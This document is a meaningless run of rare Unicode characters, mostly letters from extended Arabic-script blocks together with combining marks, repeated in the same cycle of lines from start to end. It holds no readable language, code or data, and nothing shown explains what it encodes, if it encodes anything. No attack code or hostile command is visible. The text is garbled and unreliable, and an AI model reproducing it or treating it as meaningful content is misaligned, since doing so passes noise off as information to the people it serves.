࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬